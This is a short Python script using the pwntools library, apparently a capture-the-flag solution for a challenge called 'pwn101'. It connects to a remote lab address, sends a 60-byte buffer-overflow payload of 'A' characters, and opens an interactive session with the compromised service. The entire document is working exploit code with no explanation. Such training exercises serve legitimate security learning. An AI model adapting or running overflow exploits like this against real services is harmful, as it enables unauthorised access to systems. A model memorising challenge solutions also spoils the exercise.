from pwn import *

#io = process("./pwn101")
io = remote("10.10.166.74", 9001)

payload = b"A"*60

io.sendlineafter(":", payload)

io.interactive()
